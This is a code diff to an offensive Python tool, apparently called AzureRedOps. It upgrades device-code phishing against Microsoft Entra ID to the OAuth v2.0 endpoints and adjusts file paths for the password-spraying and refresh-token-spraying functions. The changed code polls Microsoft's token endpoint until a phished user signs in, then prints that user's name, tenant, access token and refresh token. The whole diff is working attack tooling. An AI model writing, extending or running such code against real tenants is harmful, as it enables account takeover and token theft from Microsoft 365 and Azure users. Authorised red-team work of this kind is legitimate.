@@ -20,7 +20,7 @@ import requests
 import datetime
 import builtins
 
-from includes.Webserver import WebServer
+from WebServer import WebServer
 from playwright.sync_api import sync_playwright
 
 VERSION = "0.1"
@@ -315,13 +315,22 @@ class AzureRedOps:
         else:
             print(f"{self.w('Error')}No Azure tenant for the '{tenant}' domain")
 
-    def device_code_start(self, autostart, appId = "d3590ed6-52b3-4102-aeff-aad2292ab01c", tenant = "common"):
+    def device_code_start(self, autostart, appId = "d3590ed6-52b3-4102-aeff-aad2292ab01c", tenant = "common", version = "v2.0"):
         if tenant == None:
             tenant = "common"
         print(f"{self.w('Success')}AppId is set to {appId}.")
         print(f"{self.w('Success')}Tenant is set to {tenant}.")
-        data = { "client_id": appId, "resource": self.default_audience }
-        response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/devicecode", data=data, send_json=False)
+        print(f"{self.w('Success')}OAuth version is set to {version}.")
+
+        if version == "v2.0":
+            scope = self.default_scope if self.default_scope != self.DEFAULT_SCOPE else f"{self.default_audience}/.default offline_access openid"
+            data = { "client_id": appId, "scope": scope }
+            url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/devicecode"
+        else:
+            data = { "client_id": appId, "resource": self.default_audience }
+            url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/devicecode"
+
+        response = self.http_request(url, data=data, send_json=False)
 
         if "error" in response:
             print(f"{self.w('Error')}{response['error']}")
@@ -332,27 +341,36 @@ class AzureRedOps:
             print(f"{self.w('Device Code')}{response['device_code']}")
             if autostart:
                 print(f"{self.w('Action')}Autostarting authentication capture.")
-                self.device_code_capture(response["device_code"], appId, tenant)
+                self.device_code_capture(response["device_code"], appId, tenant, version)
 
-    def device_code_capture(self, code, appId = "d3590ed6-52b3-4102-aeff-aad2292ab01c", tenant = "common"):
+    def device_code_capture(self, code, appId = "d3590ed6-52b3-4102-aeff-aad2292ab01c", tenant = "common", version = "v2.0"):
         if tenant == None:
             tenant = "common"
 
         token_received = False
-        data = { "client_id": appId, "resource": self.default_audience, "grant_type": "urn:ietf:params:oauth:grant-type:device_code", "code": code }
+
+        if version == "v2.0":
+            scope = self.default_scope if self.default_scope != self.DEFAULT_SCOPE else f"{self.default_audience}/.default offline_access openid"
+            data = { "client_id": appId, "scope": scope, "grant_type": "urn:ietf:params:oauth:grant-type:device_code", "device_code": code }
+            token_url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token"
+        else:
+            data = { "client_id": appId, "resource": self.default_audience, "grant_type": "urn:ietf:params:oauth:grant-type:device_code", "code": code }
+            token_url = f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token"
+
         while not token_received:
             print(f"{self.w('Action')}Fetching authentication token.")
             time.sleep(self.DELAY_REQUEST)
-            response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token", data=data, send_json=False)
+            response = self.http_request(token_url, data=data, send_json=False)
 
             if "error" in response:
-                if not "Authorization is pending" in response["error_description"]:
+                if not "authorization_pending" in response.get("error", "") and not "Authorization is pending" in response.get("error_description", ""):
                     print(f"{self.w('Error')}{response['error']}")
-                    print(f"{self.w('Description')}{response['error_description']}")
+                    print(f"{self.w('Description')}{response.get('error_description', '')}")
+                    break
             else:
                 token_received = True
                 token = self.decode_jwt(response["access_token"])
-                print(f"{self.w('Username')}{token.get('upn')}")
+                print(f"{self.w('Username')}{token.get('upn') or token.get('preferred_username') or token.get('email')}")
                 print(f"{self.w('Tenant ID')}{token.get('tid')}")
                 print(f"{self.w('Access Token')}{response['access_token']}")
                 print(f"{self.w('Refresh Token')}{response['refresh_token']}")
@@ -490,7 +508,7 @@ class AzureRedOps:
     def graph_spray(self, username, password, tenant, filepath = "includes/auth_apps.json"):
         apps = None
         if filepath == None:
-            filepath = "includes/auth_apps.json"
+            filepath = "auth_apps.json"
         print(f"{self.w('Action')}Spraying using {filepath} as the source.")
         with open(filepath) as f:
             apps = json.load(f)
@@ -519,7 +537,7 @@ class AzureRedOps:
     def graph_spray_refresh(self, refresh_token, tenant, version, filepath = "includes/auth_apps.json"):
         data = None
         if filepath == None:
-            filepath = "includes/auth_apps.json"
+            filepath = "auth_apps.json"
         print(f"{self.w('Action')}Spraying using {filepath} as the source.")
         with open(filepath, "r") as f:
             data = json.load(f)
@@ -566,7 +584,7 @@ class AzureRedOps:
 
     def get_known_ids(self):
         data = None
-        with open("includes/apps.json", "r") as f:
+        with open("apps.json", "r") as f:
             data = json.load(f)
 
         for app in data.get("apps"):
@@ -574,7 +592,7 @@ class AzureRedOps:
 
     def get_list_of_interest(self):
         data = None
-        with open("includes/auth_apps.json", "r") as f:
+        with open("auth_apps.json", "r") as f:
             data = json.load(f)
 
         for item in data:
@@ -582,7 +600,7 @@ class AzureRedOps:
 
     def get_ids_of_interest(self, id_only, type):
         data = None
-        with open("includes/auth_apps.json", "r") as f:
+        with open("auth_apps.json", "r") as f:
             data = json.load(f)
 
         for item in data:
@@ -924,15 +942,17 @@ def main():
     elif args.activity == "phish-start":
         app.print_hint(["Set the scope to 'https://graph.microsoft.com/.default offline_access openid'"])
         autostart = args.auto_start
+        version = app.is_args_set(args, "version", False) or "v2.0"
         appid = app.is_args_set(args, "appid", False)
         tenant_id = app.is_args_set(args, "tenant_id", False)
-        app.device_code_start(autostart, appid, tenant_id)
+        app.device_code_start(autostart, appid, tenant_id, version)
 
     elif args.activity == "phish-capture":
         code = app.is_args_set(args, "devicecode")
+        version = app.is_args_set(args, "version", False) or "v2.0"
         appid = app.is_args_set(args, "appid", False)
         tenant_id = app.is_args_set(args, "tenant_id", False)
-        app.device_code_capture(code, appid, tenant_id)
+        app.device_code_capture(code, appid, tenant_id, version)
 
     elif args.activity == "auth":
         version = app.is_args_set(args, "version")
